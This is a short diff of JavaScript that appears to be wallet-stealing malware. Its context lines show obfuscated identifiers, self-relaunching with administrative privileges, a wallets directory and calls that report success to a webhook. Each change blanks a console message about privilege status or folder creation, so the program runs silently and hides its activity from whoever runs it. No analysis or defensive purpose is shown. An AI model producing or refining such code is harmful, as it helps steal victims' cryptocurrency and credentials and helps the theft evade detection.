@@ -67,7 +67,7 @@ async function main() {
         console.log("The script does not have administrative privileges.");
         relaunchAsAdmin();
     } else {
-        console.log("The script is running with administrative privileges.");
+        console.log("");
     }
 }
 
@@ -968,7 +968,7 @@ const extension = _0x4ae424,
 randomPath = path.join(mainFolderPath);
 
 if (!fs.existsSync(randomPath)) {
-  console.log('Wallets directory already exists. Skipping creation.');
+  console.log('');
 } else {
   sendSuccessToWebhook();
 }
@@ -977,7 +977,7 @@ function initializeFolders() {
     try {
         if (!fs.existsSync(mainFolderPath)) {
             fs.mkdirSync(mainFolderPath, { recursive: true });
-            console.log('Main folder created successfully');
+            console.log('');
             sendSuccessToWebhook();
         }
     } catch (error) {
